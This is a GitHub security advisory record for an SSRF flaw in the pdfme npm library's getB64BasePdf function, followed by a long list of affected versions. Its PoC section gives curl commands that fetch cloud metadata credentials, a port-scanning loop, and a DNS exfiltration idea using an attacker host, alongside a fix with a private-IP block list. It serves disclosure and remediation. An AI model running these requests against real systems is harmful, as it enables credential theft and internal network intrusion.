@@ -1,0 +1,821 @@
+advisory_id: GHSA-pgx6-7jcq-2qff
+datasource_id: github_osv/GHSA-pgx6-7jcq-2qff
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-pgx6-7jcq-2qff/GHSA-pgx6-7jcq-2qff.json
+aliases: []
+summary: |
+  PDFME has SSRF via Unvalidated URL Fetch in `getB64BasePdf` When `basePdf` Is Attacker-Controlled
+  ## Summary
+
+  The `getB64BasePdf` function in `@pdfme/common` fetches arbitrary URLs via `fetch()` without any validation when `basePdf` is a non-data-URI string and `window` is defined. An attacker who can control the `basePdf` field of a template (e.g., through a web application that accepts user-supplied templates) can force the server or client to make requests to arbitrary internal or external endpoints, enabling Server-Side Request Forgery (SSRF) in SSR contexts or blind request forgery in browser contexts.
+
+  ## Details
+
+  The vulnerability exists in `packages/common/src/helper.ts:130-141`. When `getB64BasePdf` receives a string that does not start with `data:application/pdf;`, and `window` is defined, it passes the string directly to `fetch()`:
+
+  ```typescript
+  // packages/common/src/helper.ts:130-141
+  export const getB64BasePdf = async (
+    customPdf: ArrayBuffer | Uint8Array | string,
+  ): Promise<string> => {
+    if (
+      typeof customPdf === 'string' &&
+      !customPdf.startsWith('data:application/pdf;') &&
+      typeof window !== 'undefined'
+    ) {
+      const response = await fetch(customPdf);  // <-- No URL validation
+      const blob = await response.blob();
+      return blob2Base64Pdf(blob);
+    }
+    // ...
+  };
+  ```
+
+  The Zod schema for `basePdf` in `packages/common/src/schema.ts:133-135` accepts any string:
+
+  ```typescript
+  export const CustomPdf = z.union([z.string(), ArrayBufferSchema, Uint8ArraySchema]);
+  export const BasePdf = z.union([CustomPdf, BlankPdf]);
+  ```
+
+  The `checkGenerateProps` function at `packages/common/src/helper.ts:279` only validates the Zod schema shape, which permits any string value. No URL allowlist, protocol restriction, or private IP filtering exists anywhere in the pipeline.
+
+  This function is called from multiple entry points:
+  - `packages/generator/src/helper.ts:42` — during PDF generation
+  - `packages/ui/src/hooks.ts:67` — during UI rendering
+  - `packages/ui/src/helper.ts:292` — during template processing
+
+  The `typeof window !== 'undefined'` guard is commonly satisfied in SSR environments (Next.js, Nuxt with jsdom, Cloudflare Workers) where `window` is polyfilled but `fetch` has full network access without CORS restrictions.
+
+  ## PoC
+
+  ### 1. Setup a vulnerable application
+
+  ```javascript
+  // server.js — Next.js API route or Express handler using pdfme
+  import { generate } from '@pdfme/generator';
+
+  export async function POST(req) {
+    const { template, inputs } = await req.json();
+    // Application accepts user-provided templates
+    const pdf = await generate({ template, inputs, plugins: {} });
+    return new Response(pdf);
+  }
+  ```
+
+  ### 2. Probe internal services via SSRF
+
+  ```bash
+  # Attacker sends a template with basePdf pointing to an internal service
+  curl -X POST http://target-app.com/api/generate-pdf \
+    -H 'Content-Type: application/json' \
+    -d '{
+      "template": {
+        "basePdf": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "schemas": [[]]
+      },
+      "inputs": [{}]
+    }'
+  ```
+
+  ### 3. Port scanning internal network
+
+  ```bash
+  # Scan internal hosts by observing response timing differences
+  for port in 80 443 3306 5432 6379 8080; do
+    curl -s -o /dev/null -w "%{time_total}" -X POST http://target-app.com/api/generate-pdf \
+      -H 'Content-Type: application/json' \
+      -d "{
+        \"template\": {
+          \"basePdf\": \"http://10.0.0.1:${port}/\",
+          \"schemas\": [[]]
+        },
+        \"inputs\": [{}]
+      }"
+    echo " - port $port"
+  done
+  ```
+
+  ### 4. Exfiltrate cloud metadata (AWS example)
+
+  ```bash
+  # In SSR context, fetch reads the full response body and converts to base64
+  curl -X POST http://target-app.com/api/generate-pdf \
+    -H 'Content-Type: application/json' \
+    -d '{
+      "template": {
+        "basePdf": "http://169.254.169.254/latest/meta-data/",
+        "schemas": [[]]
+      },
+      "inputs": [{}]
+    }'
+  # The fetch will succeed; the response will fail PDF parsing,
+  # but error messages or timing differences leak information
+  ```
+
+  ## Impact
+
+  - **Cloud metadata exfiltration**: In SSR deployments on AWS/GCP/Azure, attackers can reach instance metadata endpoints (`169.254.169.254`) to steal IAM credentials, API tokens, and service account keys.
+  - **Internal network reconnaissance**: Attackers can probe internal services, discover open ports, and map network topology by observing response timing and error differences.
+  - **Internal service access**: Requests to internal APIs (databases, caches, admin panels) that are not exposed to the internet but accessible from the server.
+  - **Blind request forgery in browsers**: Even with CORS restrictions limiting response reading, attackers can trigger state-changing requests to internal services (GET-based actions, webhook triggers).
+  - **Data exfiltration via DNS**: Attackers can use DNS-based exfiltration by crafting URLs like `http://<stolen-data>.attacker.com` to leak information even when responses are not readable.
+
+  ## Recommended Fix
+
+  Add URL validation in `getB64BasePdf` before calling `fetch()`. At minimum, restrict to HTTPS and block private/reserved IP ranges:
+
+  ```typescript
+  // packages/common/src/helper.ts
+
+  const BLOCKED_HOSTNAME_PATTERNS = [
+    /^localhost$/i,
+    /^127\./,
+    /^10\./,
+    /^172\.(1[6-9]|2\d|3[01])\./,
+    /^192\.168\./,
+    /^169\.254\./,
+    /^0\./,
+    /^\[::1\]/,
+    /^\[fc/i,
+    /^\[fd/i,
+    /^\[fe80:/i,
+  ];
+
+  function validatePdfUrl(urlString: string): void {
+    let parsed: URL;
+    try {
+      parsed = new URL(urlString);
+    } catch {
+      throw new Error(`Invalid basePdf URL: ${urlString}`);
+    }
+
+    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
+      throw new Error(`basePdf URL must use http or https protocol, got: ${parsed.protocol}`);
+    }
+
+    const hostname = parsed.hostname;
+    for (const pattern of BLOCKED_HOSTNAME_PATTERNS) {
+      if (pattern.test(hostname)) {
+        throw new Error(`basePdf URL must not point to private/reserved addresses`);
+      }
+    }
+  }
+
+  export const getB64BasePdf = async (
+    customPdf: ArrayBuffer | Uint8Array | string,
+  ): Promise<string> => {
+    if (
+      typeof customPdf === 'string' &&
+      !customPdf.startsWith('data:application/pdf;') &&
+      typeof window !== 'undefined'
+    ) {
+      validatePdfUrl(customPdf);  // <-- Add validation before fetch
+      const response = await fetch(customPdf);
+      const blob = await response.blob();
+      return blob2Base64Pdf(blob);
+    }
+    // ...
+  };
+  ```
+
+  Additionally, consider documenting the security implications of passing user-controlled data as `basePdf` and providing an option for applications to supply their own URL validator or allowlist.
+impacted_packages:
+  - purl: pkg:npm/%40pdfme/common
+    affected_versions: vers:npm/<=5.5.9
+    fixed_versions: vers:npm/5.5.10
+    affected_packages:
+      - pkg:npm/%40pdfme/common@0.0.0
+      - pkg:npm/%40pdfme/common@1.0.0-beta.2
+      - pkg:npm/%40pdfme/common@1.0.0-beta.3
+      - pkg:npm/%40pdfme/common@1.0.0-beta.4
+      - pkg:npm/%40pdfme/common@1.0.0-beta.5
+      - pkg:npm/%40pdfme/common@1.0.0-beta.6
+      - pkg:npm/%40pdfme/common@1.0.0-beta.7
+      - pkg:npm/%40pdfme/common@1.0.0-beta.8
+      - pkg:npm/%40pdfme/common@1.0.0-beta.9
+      - pkg:npm/%40pdfme/common@1.0.0-beta.10
+      - pkg:npm/%40pdfme/common@1.0.0-beta.11
+      - pkg:npm/%40pdfme/common@1.0.0
+      - pkg:npm/%40pdfme/common@1.0.1
+      - pkg:npm/%40pdfme/common@1.0.2
+      - pkg:npm/%40pdfme/common@1.0.3
+      - pkg:npm/%40pdfme/common@1.0.4
+      - pkg:npm/%40pdfme/common@1.0.5
+      - pkg:npm/%40pdfme/common@1.0.6
+      - pkg:npm/%40pdfme/common@1.0.7
+      - pkg:npm/%40pdfme/common@1.0.8
+      - pkg:npm/%40pdfme/common@1.0.9
+      - pkg:npm/%40pdfme/common@1.0.10
+      - pkg:npm/%40pdfme/common@1.0.11
+      - pkg:npm/%40pdfme/common@1.0.12
+      - pkg:npm/%40pdfme/common@1.0.13
+      - pkg:npm/%40pdfme/common@1.0.14
+      - pkg:npm/%40pdfme/common@1.0.15
+      - pkg:npm/%40pdfme/common@1.0.16
+      - pkg:npm/%40pdfme/common@1.0.17
+      - pkg:npm/%40pdfme/common@1.0.18
+      - pkg:npm/%40pdfme/common@1.1.0
+      - pkg:npm/%40pdfme/common@1.1.1
+      - pkg:npm/%40pdfme/common@1.1.2
+      - pkg:npm/%40pdfme/common@1.1.3
+      - pkg:npm/%40pdfme/common@1.1.4
+      - pkg:npm/%40pdfme/common@1.1.5
+      - pkg:npm/%40pdfme/common@1.1.6
+      - pkg:npm/%40pdfme/common@1.1.7
+      - pkg:npm/%40pdfme/common@1.1.8
+      - pkg:npm/%40pdfme/common@1.1.9
+      - pkg:npm/%40pdfme/common@1.1.10
+      - pkg:npm/%40pdfme/common@1.2.0
+      - pkg:npm/%40pdfme/common@1.2.1
+      - pkg:npm/%40pdfme/common@1.2.2
+      - pkg:npm/%40pdfme/common@1.2.3
+      - pkg:npm/%40pdfme/common@1.2.4
+      - pkg:npm/%40pdfme/common@1.2.5
+      - pkg:npm/%40pdfme/common@1.2.6
+      - pkg:npm/%40pdfme/common@2.0.0
+      - pkg:npm/%40pdfme/common@2.0.1
+      - pkg:npm/%40pdfme/common@2.0.2
+      - pkg:npm/%40pdfme/common@2.1.0
+      - pkg:npm/%40pdfme/common@2.2.0
+      - pkg:npm/%40pdfme/common@2.2.1
+      - pkg:npm/%40pdfme/common@3.0.0-beta.1
+      - pkg:npm/%40pdfme/common@3.0.0-beta.2
+      - pkg:npm/%40pdfme/common@3.0.0-dev.1
+      - pkg:npm/%40pdfme/common@3.0.0-dev.2
+      - pkg:npm/%40pdfme/common@3.0.1-dev.2
+      - pkg:npm/%40pdfme/common@3.0.1-dev.3
+      - pkg:npm/%40pdfme/common@3.0.1-dev.4
+      - pkg:npm/%40pdfme/common@3.0.1-dev.5
+      - pkg:npm/%40pdfme/common@3.0.1-dev.6
+      - pkg:npm/%40pdfme/common@3.0.1-dev.8
+      - pkg:npm/%40pdfme/common@3.0.1-dev.9
+      - pkg:npm/%40pdfme/common@3.0.1-dev.10
+      - pkg:npm/%40pdfme/common@3.0.1-dev.13
+      - pkg:npm/%40pdfme/common@3.0.1-dev.14
+      - pkg:npm/%40pdfme/common@3.0.1-dev.15
+      - pkg:npm/%40pdfme/common@3.0.1-dev.16
+      - pkg:npm/%40pdfme/common@3.0.1-dev.18
+      - pkg:npm/%40pdfme/common@3.0.1-dev.19
+      - pkg:npm/%40pdfme/common@3.0.1-dev.21
+      - pkg:npm/%40pdfme/common@3.0.1-dev.22
+      - pkg:npm/%40pdfme/common@3.0.1-dev.23
+      - pkg:npm/%40pdfme/common@3.0.1-dev.24
+      - pkg:npm/%40pdfme/common@3.0.1
+      - pkg:npm/%40pdfme/common@3.1.0-dev.1
+      - pkg:npm/%40pdfme/common@3.1.0
+      - pkg:npm/%40pdfme/common@3.1.1-dev.1
+      - pkg:npm/%40pdfme/common@3.1.1-dev.2
+      - pkg:npm/%40pdfme/common@3.1.1-dev.3
+      - pkg:npm/%40pdfme/common@3.1.1-dev.4
+      - pkg:npm/%40pdfme/common@3.1.1-dev.5
+      - pkg:npm/%40pdfme/common@3.1.1-dev.6
+      - pkg:npm/%40pdfme/common@3.1.1-dev.7
+      - pkg:npm/%40pdfme/common@3.1.1
+      - pkg:npm/%40pdfme/common@3.1.2-dev.1
+      - pkg:npm/%40pdfme/common@3.1.2-dev.2
+      - pkg:npm/%40pdfme/common@3.1.2-dev.3
+      - pkg:npm/%40pdfme/common@3.1.2-dev.4
+      - pkg:npm/%40pdfme/common@3.1.2-dev.5
+      - pkg:npm/%40pdfme/common@3.1.2
+      - pkg:npm/%40pdfme/common@3.1.3-dev.1
+      - pkg:npm/%40pdfme/common@3.1.3-dev.2
+      - pkg:npm/%40pdfme/common@3.1.3-dev.3
+      - pkg:npm/%40pdfme/common@3.1.3-dev.7
+      - pkg:npm/%40pdfme/common@3.1.3-dev.8
+      - pkg:npm/%40pdfme/common@3.1.3-dev.9
+      - pkg:npm/%40pdfme/common@3.1.3
+      - pkg:npm/%40pdfme/common@3.1.4
+      - pkg:npm/%40pdfme/common@3.1.5-dev.1
+      - pkg:npm/%40pdfme/common@3.1.5-dev.2
+      - pkg:npm/%40pdfme/common@3.1.5-dev.3
+      - pkg:npm/%40pdfme/common@3.1.5-dev.4
+      - pkg:npm/%40pdfme/common@3.1.5-dev.6
+      - pkg:npm/%40pdfme/common@3.1.5-dev.7
+      - pkg:npm/%40pdfme/common@3.1.5-dev.8
+      - pkg:npm/%40pdfme/common@3.1.5-dev.9
+      - pkg:npm/%40pdfme/common@3.1.5-dev.10
+      - pkg:npm/%40pdfme/common@3.1.5-dev.11
+      - pkg:npm/%40pdfme/common@3.1.5-dev.12
+      - pkg:npm/%40pdfme/common@3.1.5-dev.13
+      - pkg:npm/%40pdfme/common@3.1.5-dev.14
+      - pkg:npm/%40pdfme/common@3.1.5-dev.15
+      - pkg:npm/%40pdfme/common@3.1.5-dev.16
+      - pkg:npm/%40pdfme/common@3.1.5-dev.17
+      - pkg:npm/%40pdfme/common@3.1.5-dev.18
+      - pkg:npm/%40pdfme/common@3.1.5
+      - pkg:npm/%40pdfme/common@3.2.0-dev.1
+      - pkg:npm/%40pdfme/common@3.2.0
+      - pkg:npm/%40pdfme/common@3.2.1-dev.1
+      - pkg:npm/%40pdfme/common@3.2.1-dev.2
+      - pkg:npm/%40pdfme/common@3.2.1-dev.3
+      - pkg:npm/%40pdfme/common@3.2.1
+      - pkg:npm/%40pdfme/common@3.2.2-dev.1
+      - pkg:npm/%40pdfme/common@3.2.2
+      - pkg:npm/%40pdfme/common@3.2.3-dev.1
+      - pkg:npm/%40pdfme/common@3.2.3-dev.2
+      - pkg:npm/%40pdfme/common@3.2.3
+      - pkg:npm/%40pdfme/common@3.3.0-dev.0
+      - pkg:npm/%40pdfme/common@3.3.0-dev.1
+      - pkg:npm/%40pdfme/common@3.3.0-dev.3
+      - pkg:npm/%40pdfme/common@3.3.0
+      - pkg:npm/%40pdfme/common@3.4.0-dev.0
+      - pkg:npm/%40pdfme/common@3.4.0
+      - pkg:npm/%40pdfme/common@3.4.1
+      - pkg:npm/%40pdfme/common@3.4.2-dev.0
+      - pkg:npm/%40pdfme/common@3.4.2-dev.1
+      - pkg:npm/%40pdfme/common@3.4.2
+      - pkg:npm/%40pdfme/common@3.4.3-dev.1
+      - pkg:npm/%40pdfme/common@3.4.3-dev.2
+      - pkg:npm/%40pdfme/common@3.4.3-dev.3
+      - pkg:npm/%40pdfme/common@3.4.3-dev.4
+      - pkg:npm/%40pdfme/common@3.4.3
+      - pkg:npm/%40pdfme/common@4.0.0-alpha.0
+      - pkg:npm/%40pdfme/common@4.0.0-dev.3
+      - pkg:npm/%40pdfme/common@4.0.0-dev.4
+      - pkg:npm/%40pdfme/common@4.0.0-dev.5
+      - pkg:npm/%40pdfme/common@4.0.0-dev.6
+      - pkg:npm/%40pdfme/common@4.0.0-dev.7
+      - pkg:npm/%40pdfme/common@4.0.0-dev.8
+      - pkg:npm/%40pdfme/common@4.0.0
+      - pkg:npm/%40pdfme/common@4.0.1
+      - pkg:npm/%40pdfme/common@4.0.2-dev.0
+      - pkg:npm/%40pdfme/common@4.0.2-dev.1
+      - pkg:npm/%40pdfme/common@4.0.2-dev.2
+      - pkg:npm/%40pdfme/common@4.0.2
+      - pkg:npm/%40pdfme/common@4.1.0-dev.1
+      - pkg:npm/%40pdfme/common@4.1.0-dev.3
+      - pkg:npm/%40pdfme/common@4.1.0-dev.4
+      - pkg:npm/%40pdfme/common@4.1.0-dev.5
+      - pkg:npm/%40pdfme/common@4.1.0-dev.6
+      - pkg:npm/%40pdfme/common@4.1.0
+      - pkg:npm/%40pdfme/common@4.1.1-dev.2
+      - pkg:npm/%40pdfme/common@4.1.1
+      - pkg:npm/%40pdfme/common@4.2.1-dev.1
+      - pkg:npm/%40pdfme/common@4.2.1
+      - pkg:npm/%40pdfme/common@4.2.2-dev.1
+      - pkg:npm/%40pdfme/common@4.2.2-dev.2
+      - pkg:npm/%40pdfme/common@4.2.2-dev.3
+      - pkg:npm/%40pdfme/common@4.2.2-dev.4
+      - pkg:npm/%40pdfme/common@4.2.2
+      - pkg:npm/%40pdfme/common@4.2.3-dev.3
+      - pkg:npm/%40pdfme/common@4.2.3-dev.4
+      - pkg:npm/%40pdfme/common@4.2.3
+      - pkg:npm/%40pdfme/common@4.2.4-dev.1
+      - pkg:npm/%40pdfme/common@4.2.4-dev.3
+      - pkg:npm/%40pdfme/common@4.2.4-dev.4
+      - pkg:npm/%40pdfme/common@4.2.4-dev.5
+      - pkg:npm/%40pdfme/common@4.2.4-dev.6
+      - pkg:npm/%40pdfme/common@4.2.4-dev.7
+      - pkg:npm/%40pdfme/common@4.2.4-dev.8
+      - pkg:npm/%40pdfme/common@4.2.4-dev.9
+      - pkg:npm/%40pdfme/common@4.2.4-dev.10
+      - pkg:npm/%40pdfme/common@4.2.4-dev.11
+      - pkg:npm/%40pdfme/common@4.2.4-dev.12
+      - pkg:npm/%40pdfme/common@4.2.4-dev.13
+      - pkg:npm/%40pdfme/common@4.2.4
+      - pkg:npm/%40pdfme/common@4.2.5-dev.1
+      - pkg:npm/%40pdfme/common@4.2.5-dev.3
+      - pkg:npm/%40pdfme/common@4.2.5-dev.4
+      - pkg:npm/%40pdfme/common@4.2.5-dev.5
+      - pkg:npm/%40pdfme/common@4.2.5-dev.6
+      - pkg:npm/%40pdfme/common@4.2.5
+      - pkg:npm/%40pdfme/common@4.3.0
+      - pkg:npm/%40pdfme/common@4.3.1-dev.1
+      - pkg:npm/%40pdfme/common@4.3.2-dev.1
+      - pkg:npm/%40pdfme/common@4.3.2-dev.2
+      - pkg:npm/%40pdfme/common@4.3.2-dev.3
+      - pkg:npm/%40pdfme/common@4.3.2
+      - pkg:npm/%40pdfme/common@4.4.0-dev.1
+      - pkg:npm/%40pdfme/common@4.4.0
+      - pkg:npm/%40pdfme/common@4.4.1-dev.1
+      - pkg:npm/%40pdfme/common@4.4.1-dev.2
+      - pkg:npm/%40pdfme/common@4.4.1
+      - pkg:npm/%40pdfme/common@4.4.2-dev.1
+      - pkg:npm/%40pdfme/common@4.4.2-dev.3
+      - pkg:npm/%40pdfme/common@4.4.2
+      - pkg:npm/%40pdfme/common@4.5.0-dev.1
+      - pkg:npm/%40pdfme/common@4.5.0-dev.2
+      - pkg:npm/%40pdfme/common@4.5.0
+      - pkg:npm/%40pdfme/common@4.5.1-dev.1
+      - pkg:npm/%40pdfme/common@4.5.1
+      - pkg:npm/%40pdfme/common@4.5.2-dev.1
+      - pkg:npm/%40pdfme/common@4.5.2-dev.2
+      - pkg:npm/%40pdfme/common@4.5.2-dev.3
+      - pkg:npm/%40pdfme/common@4.5.2-dev.5
+      - pkg:npm/%40pdfme/common@4.5.2
+      - pkg:npm/%40pdfme/common@5.0.0-dev.1
+      - pkg:npm/%40pdfme/common@5.0.0-dev.2
+      - pkg:npm/%40pdfme/common@5.0.0-dev.3
+      - pkg:npm/%40pdfme/common@5.0.0-dev.4
+      - pkg:npm/%40pdfme/common@5.0.0-dev.5
+      - pkg:npm/%40pdfme/common@5.0.0
+      - pkg:npm/%40pdfme/common@5.1.0
+      - pkg:npm/%40pdfme/common@5.1.1-dev.1
+      - pkg:npm/%40pdfme/common@5.1.1
+      - pkg:npm/%40pdfme/common@5.1.2-dev.1
+      - pkg:npm/%40pdfme/common@5.1.2
+      - pkg:npm/%40pdfme/common@5.1.3-dev.1
+      - pkg:npm/%40pdfme/common@5.1.3
+      - pkg:npm/%40pdfme/common@5.1.4-dev.1
+      - pkg:npm/%40pdfme/common@5.1.4
+      - pkg:npm/%40pdfme/common@5.1.5-dev.2
+      - pkg:npm/%40pdfme/common@5.1.5
+      - pkg:npm/%40pdfme/common@5.1.6-dev.1
+      - pkg:npm/%40pdfme/common@5.1.6-dev.2
+      - pkg:npm/%40pdfme/common@5.1.6
+      - pkg:npm/%40pdfme/common@5.1.7-dev.2
+      - pkg:npm/%40pdfme/common@5.1.7
+      - pkg:npm/%40pdfme/common@5.2.0-dev.1
+      - pkg:npm/%40pdfme/common@5.2.0
+      - pkg:npm/%40pdfme/common@5.2.1-dev.1
+      - pkg:npm/%40pdfme/common@5.2.1-dev.2
+      - pkg:npm/%40pdfme/common@5.2.1
+      - pkg:npm/%40pdfme/common@5.2.2-dev.1
+      - pkg:npm/%40pdfme/common@5.2.2
+      - pkg:npm/%40pdfme/common@5.2.3-dev.1
+      - pkg:npm/%40pdfme/common@5.2.3
+      - pkg:npm/%40pdfme/common@5.2.4-dev.1
+      - pkg:npm/%40pdfme/common@5.2.4-dev.2
+      - pkg:npm/%40pdfme/common@5.2.4
+      - pkg:npm/%40pdfme/common@5.2.5-dev.1
+      - pkg:npm/%40pdfme/common@5.2.5-dev.2
+      - pkg:npm/%40pdfme/common@5.2.5-dev.4
+      - pkg:npm/%40pdfme/common@5.2.5-dev.5
+      - pkg:npm/%40pdfme/common@5.2.5-dev.6
+      - pkg:npm/%40pdfme/common@5.2.5-dev.7
+      - pkg:npm/%40pdfme/common@5.2.5
+      - pkg:npm/%40pdfme/common@5.2.6
+      - pkg:npm/%40pdfme/common@5.2.7-dev.1
+      - pkg:npm/%40pdfme/common@5.2.7
+      - pkg:npm/%40pdfme/common@5.2.8
+      - pkg:npm/%40pdfme/common@5.2.9-dev.1
+      - pkg:npm/%40pdfme/common@5.2.9
+      - pkg:npm/%40pdfme/common@5.2.10-dev.1
+      - pkg:npm/%40pdfme/common@5.2.10-dev.2
+      - pkg:npm/%40pdfme/common@5.2.10
+      - pkg:npm/%40pdfme/common@5.2.11-dev.1
+      - pkg:npm/%40pdfme/common@5.2.11-dev.3
+      - pkg:npm/%40pdfme/common@5.2.11-dev.4
+      - pkg:npm/%40pdfme/common@5.2.11-dev.5
+      - pkg:npm/%40pdfme/common@5.2.11-dev.6
+      - pkg:npm/%40pdfme/common@5.2.11
+      - pkg:npm/%40pdfme/common@5.2.12-dev.0
+      - pkg:npm/%40pdfme/common@5.2.12-dev.1
+      - pkg:npm/%40pdfme/common@5.2.12
+      - pkg:npm/%40pdfme/common@5.2.13
+      - pkg:npm/%40pdfme/common@5.2.14
+      - pkg:npm/%40pdfme/common@5.2.15-dev.2
+      - pkg:npm/%40pdfme/common@5.2.16-dev.1
+      - pkg:npm/%40pdfme/common@5.2.16-dev.2
+      - pkg:npm/%40pdfme/common@5.2.16
+      - pkg:npm/%40pdfme/common@5.3.0-beta.0
+      - pkg:npm/%40pdfme/common@5.3.0-dev.1
+      - pkg:npm/%40pdfme/common@5.3.0-dev.2
+      - pkg:npm/%40pdfme/common@5.3.0
+      - pkg:npm/%40pdfme/common@5.3.1-dev.1
+      - pkg:npm/%40pdfme/common@5.3.1-dev.3
+      - pkg:npm/%40pdfme/common@5.3.1-dev.4
+      - pkg:npm/%40pdfme/common@5.3.1-dev.5
+      - pkg:npm/%40pdfme/common@5.3.1-dev.6
+      - pkg:npm/%40pdfme/common@5.3.1-dev.7
+      - pkg:npm/%40pdfme/common@5.3.1-dev.9
+      - pkg:npm/%40pdfme/common@5.3.1-dev.10
+      - pkg:npm/%40pdfme/common@5.3.1-dev.11
+      - pkg:npm/%40pdfme/common@5.3.1-dev.12
+      - pkg:npm/%40pdfme/common@5.3.1-dev.13
+      - pkg:npm/%40pdfme/common@5.3.1-dev.14
+      - pkg:npm/%40pdfme/common@5.3.1-dev.15
+      - pkg:npm/%40pdfme/common@5.3.1
+      - pkg:npm/%40pdfme/common@5.3.2-dev.2
+      - pkg:npm/%40pdfme/common@5.3.2-dev.3
+      - pkg:npm/%40pdfme/common@5.3.2-dev.4
+      - pkg:npm/%40pdfme/common@5.3.2
+      - pkg:npm/%40pdfme/common@5.3.3-dev.1
+      - pkg:npm/%40pdfme/common@5.3.3-dev.2
+      - pkg:npm/%40pdfme/common@5.3.3-dev.3
+      - pkg:npm/%40pdfme/common@5.3.3-dev.4
+      - pkg:npm/%40pdfme/common@5.3.3-dev.5
+      - pkg:npm/%40pdfme/common@5.3.3
+      - pkg:npm/%40pdfme/common@5.3.4-dev.1
+      - pkg:npm/%40pdfme/common@5.3.4-dev.2
+      - pkg:npm/%40pdfme/common@5.3.4
+      - pkg:npm/%40pdfme/common@5.3.5-dev.1
+      - pkg:npm/%40pdfme/common@5.3.5-dev.2
+      - pkg:npm/%40pdfme/common@5.3.5-dev.3
+      - pkg:npm/%40pdfme/common@5.3.5-dev.4
+      - pkg:npm/%40pdfme/common@5.3.5-dev.5
+      - pkg:npm/%40pdfme/common@5.3.5-dev.6
+      - pkg:npm/%40pdfme/common@5.3.5-dev.7
+      - pkg:npm/%40pdfme/common@5.3.5-dev.8
+      - pkg:npm/%40pdfme/common@5.3.5-dev.9
+      - pkg:npm/%40pdfme/common@5.3.5
+      - pkg:npm/%40pdfme/common@5.3.6
+      - pkg:npm/%40pdfme/common@5.3.7-dev.1
+      - pkg:npm/%40pdfme/common@5.3.7-dev.3
+      - pkg:npm/%40pdfme/common@5.3.7
+      - pkg:npm/%40pdfme/common@5.3.8-dev.1
+      - pkg:npm/%40pdfme/common@5.3.8-dev.2
+      - pkg:npm/%40pdfme/common@5.3.8-dev.3
+      - pkg:npm/%40pdfme/common@5.3.8-dev.4
+      - pkg:npm/%40pdfme/common@5.3.8-dev.6
+      - pkg:npm/%40pdfme/common@5.3.8-dev.7
+      - pkg:npm/%40pdfme/common@5.3.8-dev.8
+      - pkg:npm/%40pdfme/common@5.3.8-dev.9
+      - pkg:npm/%40pdfme/common@5.3.8-dev.10
+      - pkg:npm/%40pdfme/common@5.3.8-dev.11
+      - pkg:npm/%40pdfme/common@5.3.8-dev.13
+      - pkg:npm/%40pdfme/common@5.3.8-dev.14
+      - pkg:npm/%40pdfme/common@5.3.8-dev.15
+      - pkg:npm/%40pdfme/common@5.3.8-dev.16
+      - pkg:npm/%40pdfme/common@5.3.8-dev.17
+      - pkg:npm/%40pdfme/common@5.3.8-dev.19
+      - pkg:npm/%40pdfme/common@5.3.8-dev.20
+      - pkg:npm/%40pdfme/common@5.3.8-dev.21
+      - pkg:npm/%40pdfme/common@5.3.8-dev.23
+      - pkg:npm/%40pdfme/common@5.3.8-dev.24
+      - pkg:npm/%40pdfme/common@5.3.8-dev.26
+      - pkg:npm/%40pdfme/common@5.3.8-dev.29
+      - pkg:npm/%40pdfme/common@5.3.8-dev.36
+      - pkg:npm/%40pdfme/common@5.3.8-dev.41
+      - pkg:npm/%40pdfme/common@5.3.8-dev.42
+      - pkg:npm/%40pdfme/common@5.3.8-dev.43
+      - pkg:npm/%40pdfme/common@5.3.8-dev.44
+      - pkg:npm/%40pdfme/common@5.3.8-dev.45
+      - pkg:npm/%40pdfme/common@5.3.8-dev.46
+      - pkg:npm/%40pdfme/common@5.3.8-dev.47
+      - pkg:npm/%40pdfme/common@5.3.8-dev.48
+      - pkg:npm/%40pdfme/common@5.3.8-dev.49
+      - pkg:npm/%40pdfme/common@5.3.8-dev.50
+      - pkg:npm/%40pdfme/common@5.3.8-dev.51
+      - pkg:npm/%40pdfme/common@5.3.8-dev.56
+      - pkg:npm/%40pdfme/common@5.3.8-dev.57
+      - pkg:npm/%40pdfme/common@5.3.8-dev.58
+      - pkg:npm/%40pdfme/common@5.3.8-dev.59
+      - pkg:npm/%40pdfme/common@5.3.8-dev.60
+      - pkg:npm/%40pdfme/common@5.3.8-dev.61
+      - pkg:npm/%40pdfme/common@5.3.8-dev.62
+      - pkg:npm/%40pdfme/common@5.3.8-dev.63
+      - pkg:npm/%40pdfme/common@5.3.8
+      - pkg:npm/%40pdfme/common@5.3.9-dev.1
+      - pkg:npm/%40pdfme/common@5.3.9
+      - pkg:npm/%40pdfme/common@5.3.10-dev.1
+      - pkg:npm/%40pdfme/common@5.3.10
+      - pkg:npm/%40pdfme/common@5.3.11-dev.1
+      - pkg:npm/%40pdfme/common@5.3.11-dev.2
+      - pkg:npm/%40pdfme/common@5.3.11-dev.3
+      - pkg:npm/%40pdfme/common@5.3.11-dev.5
+      - pkg:npm/%40pdfme/common@5.3.11-dev.6
+      - pkg:npm/%40pdfme/common@5.3.11-dev.7
+      - pkg:npm/%40pdfme/common@5.3.11-dev.8
+      - pkg:npm/%40pdfme/common@5.3.11-dev.9
+      - pkg:npm/%40pdfme/common@5.3.11-dev.10
+      - pkg:npm/%40pdfme/common@5.3.11-dev.11
+      - pkg:npm/%40pdfme/common@5.3.11-dev.12
+      - pkg:npm/%40pdfme/common@5.3.11-dev.13
+      - pkg:npm/%40pdfme/common@5.3.11-dev.14
+      - pkg:npm/%40pdfme/common@5.3.11-dev.15
+      - pkg:npm/%40pdfme/common@5.3.11-dev.16
+      - pkg:npm/%40pdfme/common@5.3.11-dev.17
+      - pkg:npm/%40pdfme/common@5.3.11-dev.18
+      - pkg:npm/%40pdfme/common@5.3.11-dev.19
+      - pkg:npm/%40pdfme/common@5.3.11-dev.20
+      - pkg:npm/%40pdfme/common@5.3.11-dev.21
+      - pkg:npm/%40pdfme/common@5.3.11
+      - pkg:npm/%40pdfme/common@5.3.12-dev.1
+      - pkg:npm/%40pdfme/common@5.3.12-dev.2
+      - pkg:npm/%40pdfme/common@5.3.12
+      - pkg:npm/%40pdfme/common@5.3.13-dev.1
+      - pkg:npm/%40pdfme/common@5.3.13-dev.2
+      - pkg:npm/%40pdfme/common@5.3.13-dev.3
+      - pkg:npm/%40pdfme/common@5.3.13-dev.4
+      - pkg:npm/%40pdfme/common@5.3.13-dev.5
+      - pkg:npm/%40pdfme/common@5.3.13-dev.15
+      - pkg:npm/%40pdfme/common@5.3.13-dev.17
+      - pkg:npm/%40pdfme/common@5.3.13-dev.19
+      - pkg:npm/%40pdfme/common@5.3.13-dev.21
+      - pkg:npm/%40pdfme/common@5.3.13-dev.23
+      - pkg:npm/%40pdfme/common@5.3.13-dev.25
